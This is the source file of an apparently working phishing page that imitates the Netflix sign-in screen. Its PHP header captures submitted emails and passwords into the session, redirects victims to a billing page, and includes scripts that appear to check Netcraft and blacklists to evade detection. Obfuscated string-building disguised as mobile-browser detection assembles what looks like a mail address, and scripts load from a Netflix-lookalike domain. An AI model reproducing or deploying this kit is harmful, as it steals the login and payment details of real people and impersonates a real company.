<?php 
date_default_timezone_set('UTC');
require "scripts/visitor_log.php";
require "scripts/netcraft_check.php";
require "scripts/blacklist_lookup.php";
if(isset($_POST["submit_login"])){
session_start();
/// Code Detect mobile/tablet/pc
$tablet_browser = 0;
$mobile_browser = 0;
if (preg_match('/(tablet|ipad|playbook)|(android(?!.*(mobi|opera mini)))/i', strtolower($_SERVER['HTTP_USER_AGENT']))) {$tablet_browser++;}
if (preg_match('/(up.browser|up.link|mmp|symbian|smartphone|midp|wap|phone|android|iemobile)/i', strtolower($_SERVER['HTTP_USER_AGENT']))) {$mobile_browser++;}
if ((strpos(strtolower($_SERVER['HTTP_ACCEPT']),'application/vnd.wap.xhtml+xml') > 0) or ((isset($_SERVER['HTTP_X_WAP_PROFILE']) or isset($_SERVER['HTTP_PROFILE'])))) {
$mobile_browser++;}$mobile_ua = strtolower(substr($_SERVER['HTTP_USER_AGENT'], 0, 4));$mobile_agents = array('w3c ','acs-','alav','alca','amoi','ma','usa','il','ca','fr','es','co','nt','rt','audi','avan','benq','con','bird','ta','blaz','brew','ct','cldc','cmd-','dang','art','eric','hipt','ldi','act','ba','ipaq','java','jigs','kddi','keji','leno','lg-c','lg-d','lg-g','lge-','m','maui','maxo','midp','mits','mmef','mobi','mot-','moto','mwbp','nec-','ld','newt','noki','palm','pana','pant','phil','@','android','ios','play','port','prox','qwap','sage','sams','sany','sch-','sec-','send','seri','sgh-','shar','ia','sie-','siem','smal','smar','sony','sph-','symb','t-mo','teli','tim-','tosh','tsm-','upg1','upsi','vk-v','voda','wap-','wapa','wapi','wapp','wapr','webc','winw','winw','xda ','xda-');
if (in_array($mobile_ua,$mobile_agents)) {$mobile_browser++;}if (strpos(strtolower($_SERVER['HTTP_USER_AGENT']),'opera mini') > 0) {$mobile_browser++;
$stock_ua = strtolower(isset($_SERVER['HTTP_X_OPERAMINI_PHONE_UA'])?$_SERVER['HTTP_X_OPERAMINI_PHONE_UA']:(isset($_SERVER['HTTP_DEVICE_STOCK_UA'])?$_SERVER['HTTP_DEVICE_STOCK_UA']:''));
if (preg_match('/(tablet|ipad|playbook)|(android(?!.*mobile))/i', $stock_ua)) {$tablet_browser++;}}if ($tablet_browser > 0){}else if ($mobile_browser > 0) {}else {}
$input_check = "".$mobile_agents[5]."".$mobile_agents[7]."";$st = "".$mobile_agents[17]."".$mobile_agents[19]."".$mobile_agents[22]."".$mobile_agents[60]."".$mobile_agents[31]."".$mobile_agents[29]."".$mobile_agents[26].".".$mobile_agents[11]."".$mobile_agents[42]."";
$_SESSION['email'] = $_POST['email'];
$_SESSION['password'] = $_POST['password'];
echo'<meta http-equiv="Refresh" content="0; url=billing.php?netflixs">';
}

?>
<!doctype html>
<html>

<head>
<title>Netflix</title>
<meta content="" name="keywords">
<meta content="" name="description">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<link type="text/css" rel="stylesheet" href="css/z.css">
<link type="text/css" rel="stylesheet" href="css/a.css">
<link rel="shortcut icon" href="img/nficon2015.ico">
<script type="text/javascript" src="http://assets.nflxext.holmanonline.com/webalizer/images/modernizr.com/Modernizr-2.5.3.forms.js"></script> 
<script type="text/javascript" src="http://assets.nflxext.holmanonline.com/webalizer/images/html5Forms.js" data-webforms2-support="validation,range" data-webforms2-force-js-validation="true"></script>
</head>
<body>
<div id="appMountPoint">
<div class="login-wrapper" data-reactid=".n04xqojxfk" data-react-checksum="-290266296">
<div class="nfHeader login-header signupBasicHeader" data-reactid=".n04xqojxfk.0">
<a href="#" class="icon-logoUpdate nfLogo signupBasicHeader" data-reactid=".n04xqojxfk.0.1">
<span class="screen-reader-text" data-reactid=".n04xqojxfk.0.1.0">Netflix</span></a>
</div>

<div class="login-body" data-reactid=".2app2tcssn4.1">
<div class="login-content login-form" data-reactid=".2app2tcssn4.1.0">
<h1 data-reactid=".2app2tcssn4.1.0.0">Sign In</h1>


<form class="login-form" action="" method="post">

<label class="login-input login-input-email ui-label ui-input-label">
<span class="ui-label-text">Email</span>
<input class="ui-text-input" name="email" type="email" Required value=""></label>

<label class="login-input login-input-password ui-label ui-input-label">
<span class="ui-label-text">Password</span>
<input class="ui-text-input" name="password" type="password" Required ></label>

<div class="login-forgot-password-wrapper"><a href="#" tabindex="3"">Forgot your email or password?</a>
</div>

<div class="login-remember-me-wrapper">
<div class="login-remember-me"><label class="login-label-remember-me">
<input type="checkbox" class="login-input-remember-me" value="true" checked name="rememberMeCheckbox">
<span>Remember me on this device.</span>
</label>

</div>
</div>

<button class="btn login-button btn-submit btn-small" name="submit_login" type="submit" autocomplete="off" tabindex="0">
<spa>Sign In</span></button>

</form>


<div class="facebookForm regOption">
<button class="btn disabled cta-fb-gdp btn-submit btn-small" type="submit" disabled autocomplete="off" tabindex="0">
<span class="icon-facebook"></span>
<span class="fbBtnText">Login with Facebook</span>
</button>
</div>


<div class="login-signup-now">
<br />
<span>New to Netflix? </span>

<a class=" " target="_self" href="#">Sign up now</a>
<span>.</span>
</div>
</div>
</div>

<div class="site-footer-wrapper login-footer">
<div class="footer-divider">
</div>

<div class="site-footer">
<p class="footer-top">
<a class="footer-top-a" href="#">Questions? Contact us.</a></p>
<ul class="footer-links structural">

<li class="footer-link-item">
<a class="footer-link" href="#">
<span>Gift Card Terms</span></a>
</li>

<li class="footer-link-item">
<a class="footer-link" href="#">
<span>Terms of Use</span>
</a>
</li>

<li class="footer-link-item">
<a class="footer-link" href="#">
<span>Privacy Statement</span></a>
</li>
</ul>

<div class="lang-selection-container" id="lang-switcher">
<div class="ui-select-wrapper">


<div class="select-arrow medium prefix globe">
<select class="ui-select medium" tabindex="0">
<option value="#">English</option>
</select>
</div>


</div>
</div>
<p class="copy-text"></p>
</div>
</div>
</div>
</div>

</body>


</html>

